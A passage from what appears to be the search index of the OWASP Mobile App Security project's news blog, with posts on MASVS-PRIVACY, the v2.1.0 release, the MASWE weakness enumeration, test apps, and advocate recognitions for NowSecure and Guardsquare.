sensitive user data to deliver their core functionalities. This data ranges from personally identifiable information (PII), health metrics, location data, to device identifiers. Mobile devices are a constant companion to users, always connected, and equipped with numerous sensors\u2014including cameras, microphones, GPS and BLE\u2014that generate data capable of inferring user behavior and even identifying individuals. The landscape is further complicated by advanced tracking techniques, the integration of third-party SDKs, and a heightened awareness of privacy issues among users and regulators. As a response, there's a growing trend towards on-device processing to keep user data localized and more secure.</p> <p>Today we're excited to announce the release of the new MASVS-PRIVACY, a new MASVS category and MAS profile with focus on privacy. The new profile is designed to help organizations and individuals assess the privacy implications of their mobile applications and make informed decisions.</p> <p>The new controls are:</p> <ul> <li>MASVS-PRIVACY-1: The app minimizes access to sensitive data and resources.</li> <li>MASVS-PRIVACY-2: The app prevents identification of the user.</li> <li>MASVS-PRIVACY-3: The app is transparent about data collection and usage.</li> <li>MASVS-PRIVACY-4: The app offers user control over their data.</li> </ul> <p>The proposal defines the scope of the new MASVS-PRIVACY category and profile, and includes a detailed description of each control, a rationale, and a list of tests. The new profile MAS-P, establishes a baseline for privacy and is intended to work cohesively, and in some cases even overlap, with other OWASP MAS profiles, such as MAS-L1 and MAS-L2, ensuring a holistic approach to both security and privacy.</p> <p>Call to Action:</p> <p>We'd be thrilled to hear what you think! Your input is really important to us, and it can make a big difference in shaping the final version of the document. Please take a moment to review it and share your comments, feedback, and ideas.</p> <p>Review Timeline: until November 30, 2023</p> <p>Please follow the link here to access the document: https://docs.google.com/document/d/1jq7V9cRureRFF_XT7d_Z9H_SLsaFs43cE50k6zMRu0Q/edit?usp=sharing</p>","tags":[]},{"location":"news/2024/01/11/mobile-application-risk-scoring-qa/","title":"Mobile Application Risk Scoring Q&A","text":"<p>We've received many comments and excellent questions, which we've compiled and summarized, along with the authors' answers. We'd like to thank everyone who took the time to read the document and especially those who asked valuable questions.</p> <p>See Mobile Application Risk Scoring Q&amp;A</p>","tags":[]},{"location":"news/2024/01/18/masvs-v210-release--masvs-privacy/","title":"MASVS v2.1.0 Release & MASVS-PRIVACY","text":"<p>We are thrilled to announce the release of the new version of the OWASP Mobile Application Security Verification Standard (MASVS) v2.1.0 including the new MASVS-PRIVACY category and CycloneDX support.</p>","tags":[]},{"location":"news/2024/01/18/masvs-v210-release--masvs-privacy/#masvs-privacy","title":"MASVS-PRIVACY","text":"<p>After collecting and processing all feedback from the MASVS-PRIVACY Proposal we're releasing the new MASVS-PRIVACY category.</p> <p>The main goal of MASVS-PRIVACY is to provide a baseline for user privacy. It is not intended to cover all aspects of user privacy, especially when other standards and regulations such as ENISA or the GDPR already do that. We focus on the app itself, looking at what can be tested using information that's publicly available or found within the app through methods like static or dynamic analysis.</p> <p>While some associated tests can be automated, others necessitate manual intervention due to the nuanced nature of privacy. For example, if an app collects data that it didn't mention in the app store or its privacy policy, it takes careful manual checking to spot this.</p> <p>The new controls are:</p> <ul> <li>MASVS-PRIVACY-1: The app minimizes access to sensitive data and resources.</li> <li>MASVS-PRIVACY-2: The app prevents identification of the user.</li> <li>MASVS-PRIVACY-3: The app is transparent about data collection and usage.</li> <li>MASVS-PRIVACY-4: The app offers user control over their data.</li> </ul>","tags":[]},{"location":"news/2024/01/18/masvs-v210-release--masvs-privacy/#cyclonedx-support","title":"CycloneDX Support","text":"<p>The MASVS is now available in CycloneDX format (OWASP_MASVS.cdx.json), a widely adopted standard for software bill of materials (SBOM). This format enables easier integration and automation within DevOps pipelines, improving visibility and management of mobile app security. By using CycloneDX, developers and security teams can more efficiently assess, track and comply with MASVS requirements, resulting in more secure mobile applications.</p>","tags":[]},{"location":"news/2024/02/19/new-standard-for-secure-mobile-app-transactions/","title":"New Standard for Secure Mobile App Transactions","text":"<p>The Cyber Security Agency of Singapore (CSA) launched the \"Safe App Standard\" on January 10, 2024. Tailored for local app developers and service providers, this guideline is based on the OWASP Mobile Application Security Verification Standard (MASVS) and focuses on critical areas such as authentication and authorization (MASVS-AUTH), data storage (MASVS-STORAGE), and tamper resistance (MASVS-RESILIENCE). The initiative aims to protect apps from common cyber threats and ensure a safer digital space for users.</p> <p>While the Safe App Standard is a significant step forward in securing mobile applications, developers are encouraged to consider the full MASVS and select the appropriate MAS profiles for comprehensive protection. This holistic approach to app security ensures that apps go beyond meeting the baseline and are protected against a wider range of cyber threats, providing robust security for end users.</p>","tags":[]},{"location":"news/2024/07/30/new-maswe/","title":"Introducing the new Mobile App Security Weakness Enumeration (MASWE)","text":"<p>The OWASP MAS project continues to lead the way in mobile application security, providing robust and up-to-date resources for developers and security professionals alike. Our team has been working diligently with the MAS community and industry to refactor the Mobile Application Security Verification Standard (MASVS) and the Mobile Application Security Testing Guide (MASTG). In this blog post, we'll walk you through our latest addition to the MAS project: the brand new Mobile App Security Weakness Enumeration (MASWE).</p>","tags":[]},{"location":"news/2024/07/30/new-maswe/#refactoring-the-mastg","title":"Refactoring the MASTG","text":"<p>We began the refactoring process in 2021, focusing first on the MASVS and then on the MASTG. Our primary goal was to break the MASTG v1 into modular components, including tests, techniques, tools, and applications.</p> <p>This modular approach allows us to maintain and update each component independently, ensuring that the MASTG remains current and relevant. For example, in our previous structure, the MASTG consisted of large test cases within a single markdown file. This was not only difficult to maintain but also made it challenging to reference specific tests; and it was impossible to have metadata for each test.</p> <p>The new structure divides tests into individual pages (Markdown files with metadata), each with its own ID (<code>MASTG-TEST-****</code>) and links to relevant techniques (<code>MASTG-TECH-****</code>) and tools (<code>MASTG-TOOL-****</code>). This encapsulation ensures that each test is easily referenced and promotes reusability across all MAS components. For example, you can open a test and see what tools and techniques are being used, and soon you'll be able to do the same in reverse: open a tool or technique and see all the tests that use it. This deep cross-referencing can be extremely powerful when exploring the MASTG.</p>","tags":[]},{"location":"news/2024/07/30/new-maswe/#introducing-maswe","title":"Introducing MASWE","text":"<p>A significant addition to our project is the introduction of MASWE, designed to fill the gap between high-level MASVS controls and low-level MASTG tests. The MASWE identifies specific weaknesses in mobile applications, similar to Common Weakness Enumerations (CWEs) in the broader software security industry. This new layer provides a detailed description of each weakness, bridging the conceptual gap and making the testing process more coherent.</p> <p>Now MASVS, MASWE and MASTG are all seamlessly connected. We start with the high-level requirements, zoom in on the specific weaknesses, and then go low-level to the tests and hands-on with the demos. Here's how it works:</p> <ol> <li>MASVS Controls: High-level platform-agnostic requirements. <p>For example, \"The app employs current cryptography and uses it according to best practices.\" (MASVS-CRYPTO-1).</p> </li> <li>MASWE Weaknesses: Specific weaknesses, typically also platform-agnostic, related to the controls. <p>For example, \"use of predictable pseudo-random number generation\" (MASWE-0027).</p> </li> <li>MASTG Tests: Each weakness is evaluated by executing tests that guide the tester in identifying and mitigating the issues using various tools and techniques on each mobile platform. <p>For example, testing for \"insecure random API usage on Android\" (MASTG-TEST-0204).</p> </li> <li>MASTG Demos: Practical demonstrations that include working code samples and test scripts to ensure reproducibility and reliability. <p>For example, a sample using Java's <code>Random()</code> instead of <code>SecureRandom()</code> (MASTG-DEMO-0007).</p> </li> </ol>","tags":[]},{"location":"news/2024/07/30/new-maswe/#practical-applications-and-demos","title":"Practical Applications and Demos","text":"<p>To ensure our guidelines are practical and reliable, we've developed new MAS Test Apps for both Android and iOS.</p> <p>These simple, skeleton applications are designed to embed code samples directly, allowing users to validate and experiment with the provided demos. This approach ensures that all code samples are functional and up-to-date, fostering a hands-on learning experience.</p> <p>For example, to test for secure storage, MASTG-DEMO-0002 shows how to use dynamic analysis with Frida to identify the issues in the code. The demo includes:</p> <ul> <li>a Kotlin code sample (ready to be copied into the app and run on a device)</li> <li>the specific test steps for this case using Frida</li> <li>the shell script including the Frida command</li> <li>the frida script to be injected</li> <li>the output with explanations</li> <li>the final evaluation of the test</li> </ul> <p>You can run everything on your own device and validate the results yourself! Just clone the repository and navigate to the demo folder, install Frida on your computer and your Android device, and follow the steps.</p> <p> These demos can also be used as experimental playgrounds to improve your skills and practice with different cases as you study mobile app security with the MASTG. For example, you can try to reverse engineer the app and see if you're able to find the same issues as the demo or you can try to fix the issues and see if you can validate the fix.</p> <p>They are also great for advanced researchers and pentesters to quickly validate certain scenarios. For example, it's very common to find cases where Android behaves differently depending on the version or the manufacturer. With these demos, you can quickly validate if a certain issue is present on a specific device or Android version.</p>","tags":[]},{"location":"news/2024/07/30/new-maswe/#automation-with-github-actions","title":"Automation with GitHub Actions","text":"<p>Going forward, we want to automate the process of creating and validating the new demos, and ensure that the tests remain functional over time. We'll be using GitHub Actions to do this. Here is the plan:</p> <ol> <li>Build the app: Automatically build the APK/IPA for Android and iOS.</li> <li>Deploy the app to a virtual device: install and run the generated app on a virtual device.</li> <li>Execute tests and validate results: Execute static tests with tools like semgrep or radare2 as well as dynamic tests using Frida and mitmproxy on the target device. Finally, compare the test results with the expected output.</li> </ol> <p>We've currently implemented a PoC for the first step (only for Android APKs), and are working on the next steps. If you're interested in contributing to this effort, please let us know!</p>","tags":[]},{"location":"news/2024/07/30/new-maswe/#feedback-wanted","title":"Feedback Wanted","text":"<p>We encourage you to explore the new MASWE, MASTG tests and MASTG demos. Your insights and experiences are invaluable to us, and we invite you to share your feedback in our GitHub discussions to help us continue to improve. This way we can ensure that our resources are practical, reliable, and valuable for real-world application.</p> <p>You can also contribute to the project by creating new weaknesses, tests, techniques, tools, or demos. We welcome all contributions and feedback, and we look forward to working with you to make the MAS project the best it can be.</p> :simple-github: Go to our GitHub repo and check our [milestones](https://github.com/OWASP/mastg/milestones) and [GitHub discussions](https://github.com/OWASP/mastg/discussions/categories/maswe-mastg-v2-beta-Feedback).","tags":[]},{"location":"news/2025/04/09/3-years-advocate-nowsecure/","title":"Celebrating 3 Years of NowSecure as an OWASP MAS Advocate","text":"<p>Few partnerships have been as impactful as the one between NowSecure and the OWASP Mobile App Security (MAS) project. Today, as we celebrate three years of NowSecure as an OWASP MAS Advocate, we reflect on a journey marked by innovation, collaboration, and continuous improvement that has set the blueprint for future industry partnerships.</p> <p>Being a MAS Advocate means making high-impact contributions. NowSecure has delivered consistently, offering dedicated time from key experts, especially project leader Carlos Holguera, and stepping in with additional support whenever needed.</p> <p>GitHub tells a compelling story about NowSecure's involvement in the OWASP MAS project over the past three years:</p> <ul> <li>320+ Pull Requests</li> <li>230+ Reviews</li> <li>42,000+ Additions</li> <li>29,500+ Deletions</li> </ul> <p>These numbers reflect more than just activity, they demonstrate leadership. NowSecure has significantly enhanced OWASP MAS resources by contributing valuable content, reviewing community submissions, and maintaining the overall clarity and quality of the project.</p> <p>But there's more to it than just numbers. NowSecure has been a driving force behind the evolution of the OWASP MAS project, providing strategic insights, technical expertise, and a commitment to excellence that has shaped our direction and impact. Below, we look back on the key milestones and contributions over the past few years, a timeline that highlights the valuable role NowSecure has played in each step of the evolution of the MAS project.</p>","tags":[]},{"location":"news/2025/04/09/3-years-advocate-nowsecure/#rebranding-from-mstg-to-owasp-mas","title":"Rebranding From MSTG to OWASP MAS","text":"<p>In August 2022, we announced a rebranding of the project, formerly known as the \"OWASP Mobile Security Testing Guide (MSTG)\" project. The new identity, OWASP Mobile App Security (MAS), better reflects the full scope of our project, from the MAS Verification Standard (MASVS) and MAS Testing Guide (MASTG) to checklists and crackmes. And later, the Mobile App Security Weakness Enumeration (MASWE).</p> <p>NowSecure provided strategic insight and industry perspective that helped clarify the project's scope and messaging. Their early feedback ensured that the new brand not only resonated with the community but also set a clear direction for future enhancements.</p>","tags":[]},{"location":"news/2025/04/09/3-years-advocate-nowsecure/#masvs-v200-release","title":"MASVS v2.0.0 Release","text":"<p>April 2023 saw the launch of MASVS v2.0.0, a major milestone that redefined mobile app security standards. This release introduced crucial improvements:</p> <ul> <li>Abstraction &amp; Simplification: Redundant controls were removed, making MASVS more approachable for developers.</li> <li>Clarity Through Standardization: Leveraging and referencing well-established standards ensured that our controls were clear and actionable.</li> <li>Introduction of MAS Testing Profiles: Transitioning from the previous \"levels\" to new \"profiles\" allowed for more tailored assessments in real-world scenarios.</li> </ul> <p>NowSecure's technical expertise and continuous feedback during the development process were instrumental. Their real-world testing scenarios and rigorous review of the proposed changes helped shape a standard that truly meets the needs of modern mobile app security professionals.</p>","tags":[]},{"location":"news/2025/04/09/3-years-advocate-nowsecure/#mastg-refactor-part-1-testing-profiles-atomic-tests","title":"MASTG Refactor Part 1: Testing Profiles &amp; Atomic Tests","text":"<p>In July 2023, we announced the first phase of the MASTG refactor, including:</p> <ul> <li>New MAS Testing Profiles: Replacing traditional verification levels with \"profiles\" backed-up by real-world scenarios. This change allows for more tailored assessments, making it easier to understand the context and applicability of each test.</li> <li>Atomic Tests: Breaking down large tests into smaller, self-contained units has reduced ambiguity and improved traceability.</li> </ul> <p>Throughout this process, NowSecure's in-depth technical reviews and pilot testing were invaluable. Their willingness to experiment with early versions of the refactored tests ensured that the new structure was both robust and practical for real-world application, ultimately enhancing the overall quality and consistency of the MASTG.</p>","tags":[]},{"location":"news/2025/04/09/3-years-advocate-nowsecure/#mastg-refactor-part-2-modularizing-the-framework","title":"MASTG Refactor Part 2 - Modularizing the Framework","text":"<p>Later in September 2023, we announced the second phase of the MASTG refactor, focusing on a modular approach:</p> <ul> <li>The guide was reorganized into distinct components\u2014Tests, Techniques, Tools, and Apps\u2014making it easier to locate and reference specific content.</li> <li>This modularity enhances cross-referencing and maintainability of the overall framework.</li> </ul> <p>NowSecure provided critical feedback on the modularization process and performed the implementation of the new structure. Their insights into how security professionals interact with the MASTG helped shape a more user-friendly and efficient resource.</p>","tags":[]},{"location":"news/2025/04/09/3-years-advocate-nowsecure/#introducing-masvs-privacy","title":"Introducing MASVS-PRIVACY","text":"<p>October 2023 marked a significant expansion in our scope with the introduction of MASVS-PRIVACY as a proposal which was later included into the release of MASVS v2.1.0 in January 2024 after community and industry-wide thorough review.</p> <p>NowSecure's leadership in mobile security and privacy issues was a driving force behind this addition. Their proactive stance on privacy concerns and hands-on experience with data protection challenges contributed to shaping a robust baseline that addresses modern privacy demands.</p>","tags":[]},{"location":"news/2025/04/09/3-years-advocate-nowsecure/#mas-task-force","title":"MAS Task Force","text":"<p>In February 2024, we launched the MAS Task Force, a focused group of mobile security experts who meet monthly to drive the MAS project roadmap forward. Their efforts include managing GitHub issues, refining new MAS profiles and risks, assigning tasks, and developing vulnerable code snippets for both Android and iOS. Currently, the group is focused on porting V1 tests to V2 in preparation for MASTG V2.</p> <p>NowSecure's continued support plays a key role in making this initiative possible. By enabling Carlos Holguera to dedicate time and expertise to lead the effort, the task force has maintained strong momentum. With a combination of technical depth and strategic direction, Carlos has helped the group prioritize effectively and push the MAS project forward with consistency and clarity.</p>","tags":[]},{"location":"news/2025/04/09/3-years-advocate-nowsecure/#new-mas-test-apps-and-standardized-demos","title":"New MAS Test Apps and Standardized Demos","text":"<p>In May 2024, we launched new MAS Test Apps for Android and iOS, designed to facilitate hands-on learning and testing. These apps include:</p> <ul> <li>Skeleton Applications: Basic frameworks for Android and iOS, allowing users to explore and validate security scenarios.</li> <li>Code Samples: Embedded within the apps, these samples demonstrate best (and worst) practices and common pitfalls in mobile app security.</li> <li>Build Automation: Leveraging GitHub Actions, we automated the build and MASTG integration process for these demos, ensuring that they remain up-to-date and functional.</li> </ul> <p>NowSecure's expertise in mobile app security testing was invaluable in the development of these test apps. Their insights into real-world vulnerabilities and hands-on experience with mobile security challenges helped shape the design and functionality of the apps, ensuring that they are both practical and effective for users.</p>","tags":[]},{"location":"news/2025/04/09/3-years-advocate-nowsecure/#introducing-the-owasp-maswe","title":"Introducing the OWASP MASWE","text":"<p>July 2024 saw the introduction of the Mobile App Security Weakness Enumeration (MASWE):</p> <ul> <li>MASWE bridges the gap between high-level MASVS controls and detailed MASTG tests.</li> <li>It offers a granular view of specific weaknesses, enhancing traceability from requirements down to individual test cases.</li> </ul> <p>NowSecure's comprehensive review and detailed feedback on early drafts of MASWE were critical. Their ability to pinpoint real-world vulnerabilities and suggest actionable improvements helped shape MASWE into a tool that complements both MASVS and MASTG, ensuring that our framework remains holistic and responsive to emerging threats.</p>","tags":[]},{"location":"news/2025/04/09/3-years-advocate-nowsecure/#owasp-project-summit-2024","title":"OWASP Project Summit 2024","text":"<p>In November 2024, we hosted the OWASP Project Summit, where NowSecure led the mobile app security track. This five-day event brought together experts from various companies to discuss the future of mobile security, share insights, and collaborate on innovative solutions. During the summit, approximately 40 pull requests were created, and countless discussions were held.</p> <p>NowSecure played a key role by reviewing the contributions and driving technical discussions, ensuring that the ideas generated were actionable and aligned with the project's goals. Under the leadership of Carlos Holguera, who helped organize and guide the track, NowSecure fostered an environment of collaboration and knowledge sharing\u2014setting a high standard for future OWASP events.</p>","tags":[]},{"location":"news/2025/04/09/3-years-advocate-nowsecure/#looking-ahead","title":"Looking Ahead","text":"<p>As we celebrate this three-year partnership, we're excited about what lies ahead. These contributions aren't just milestones, they're building blocks for the future. Thanks to the incredible community support, ongoing advocacy, and passion of organizations like NowSecure, the next chapters of the MAS project promise even greater innovation and impact in the years to come.</p> <p>We invite you to join us on this journey, share your insights, and contribute to shaping the future of mobile security.</p> <p> Thank you, NowSecure, for being a beacon of excellence and a trusted partner in our mission to secure mobile applications worldwide. </p>","tags":[]},{"location":"news/2025/05/23/new-advocate-guardsquare/","title":"Guardsquare Achieves MAS Advocate Status","text":"<p>We are very happy to announce that Guardsquare has officially been granted the MAS Advocate status, the highest recognition possible within the OWASP Mobile Application Security (MAS) project.</p> <p>This status isn't handed out lightly. It's reserved for organizations that have demonstrated consistent, high-impact contributions over a sustained period, dedicating not just technical resources but genuine commitment and passion to the OWASP MAS project, going beyond occasional contributions, as outlined in our official guidelines. The path to MAS Advocate demands at least six months of proven, impactful support, and, in reality, often much longer depending on the scope and depth of contributions.</p>","tags":[]},{"location":"news/2025/05/23/new-advocate-guardsquare/#guardsquares-commitment","title":"Guardsquare's Commitment","text":"<p>Since their application on February 7, 2023, Guardsquare has increasingly met our expectations and exceeded them on many occasions. While the MAS Advocate process requires a minimum of six months of consistent engagement, their journey extended well beyond that, reflecting the depth, consistency, and impact of their contributions.</p> <p>Some highlights about Guardsquare's involvement include:</p> <ul> <li>Active participation in the MAS Task Force: Guardsquare has been a consistent presence in our monthly calls, bringing ideas, asking questions, and proactively pushing for core initiatives.</li> <li>Consistent, high-value contributions: Including numerous pull requests, many focused on porting v1 to v2 tests, always with complete demos and documentation.</li> <li>Peer reviews and thought leadership: Providing in-depth, actionable feedback on pull requests and issues, helping maintain the quality and integrity of the MASTG and the ambitious refactoring to v2.</li> </ul> <p>Their involvement culminated in a major milestone during the OWASP Project Summit in November 2024. This five-day event brought together mobile security experts from around the globe. Among the ~40 pull requests created during the summit, the majority were contributed by Guardsquare's team: Dennis Titze, Jan Seredynski, Nuno Antunes, and Pascal Jungblut.</p>","tags":[]},{"location":"news/2025/05/23/new-advocate-guardsquare/#why-they-committed-and-why-it-matters","title":"Why They Committed, and Why It Matters","text":"<p>We asked the Guardsquare team why they decided to commit to OWASP MAS. Here's what they said:</p> <p>\"We recognized that typical standards for application security are lacking the precision and nuance that is relevant to mobile application architectures. We felt the OWASP MAS project was headed in the right direction by providing much more specific and actionable guidance for mobile development teams on how to secure their applications.\" \u2014 Ryan Lloyd</p>","tags":[]},{"location":"news/2025/05/23/new-advocate-guardsquare/#a-win-win-situation","title":"A Win-Win Situation","text":"<p>Their contributions have not only benefited the OWASP MAS project and its community but have also had a direct impact on Guardsquare's own team and offerings:</p> <p>\"Our participation has raised awareness about mobile app security, something that's still too often an afterthought. Through a standards-based approach, we're helping to bring vital security topics to the forefront, which in turn drives more interest in our solutions.\" \u2014 Ryan Lloyd</p> <p>Beyond the organizational benefits, participation in MAS has been a rewarding experience for the individual contributors:</p> <p>\"This project really expanded my perspective on security. I used to focus mainly on reverse engineering and resilience, but this effort pushed me into new areas, like the MASVS-STORAGE category, which deepened my understanding of how mobile apps handle sensitive data.\" \u2014 Jan Seredynski</p> <p>\"The project gave me the opportunity to connect with people from diverse backgrounds, sparking dynamic conversations about secure implementation practices. It's been very rewarding to see the standards evolve as a result of these collaborations.\" \u2014 Dennis Titze</p>","tags":[]},{"location":"news/2025/05/23/new-advocate-guardsquare/#a-model-for-others-to-follow","title":"A Model for Others to Follow","text":"<p>Guardsquare's journey is a blueprint for how companies can engage meaningfully with open security standards. Their commitment, ongoing into 2025 and beyond, sets a powerful example.</p> <p>\"The mobile app security landscape benefits enormously from diverse perspectives. By expanding the base of contribution, we can offer more depth and breadth in the resources we're providing to the community, and reach our goal of a complete MASVS/MASTG refactor more quickly.\" \u2014 Ryan Lloyd</p> <p>We hope others follow their lead. Their story shows what's possible when a company commits time, talent, and heart to improving the state of mobile application security.</p>","tags":[]},{"location":"news/2025/05/23/new-advocate-guardsquare/#ready-to-join","title":"Ready to Join?","text":"<p>If your organization is passionate about mobile security and ready to make a real impact, consider joining the MAS Task Force. Whether you're contributing tests, reviewing PRs, or helping shape the next generation of standards, there's a place for you.</p> <p>You can read more about the MAS Advocate status and our other contributors on our website.</p> <p>Congratulations once again to Guardsquare, we're proud to have you onboard as a MAS Advocate!</p>","tags":[]},{"location":"news/archive/2025/","title":"2025","text":"","tags":[]},{"location":"news/archive/2024/","title":"2024","text":"","tags":[]},{"location":"news/archive/2023/","title":"2023","text":"","tags":[]},{"location":"news/archive/2022/","title":"2022","text":"","tags":[]},{"location":"news/archive/2021/","title":"2021","text":"","tags":[]},{"location":"news/archive/2020/","title":"2020","text":"","tags":[]},{"location":"news/archive/2019/","title":"2019","text":"","tags":[]},{"location":"news/archive/2018/","title":"2018","text":"","tags":[]},{"location":"news/archive/2017/","title":"2017","text":"","tags":[]},{"location":"news/archive/2016/","title":"2016","text":"","tags":[]},{"location":"news/page/2/","title":"Blog","text":"","tags":[]},{"location":"news/page/3/","title":"Blog","text":"","tags":[]},{"location":"news/page/4/","title":"Blog","text":"","tags":[]},{"location":"news/page/5/","title":"Blog","text":"","tags":[]},{"location":"news/page/6/","title":"Blog","text":"","tags":[]},{"location":"news/archive/2019/page/2/","title":"2019","text":"","tags":[]},{"location":"news/archive/2018/page/2/","title":"2018","text":"","tags":[]}]}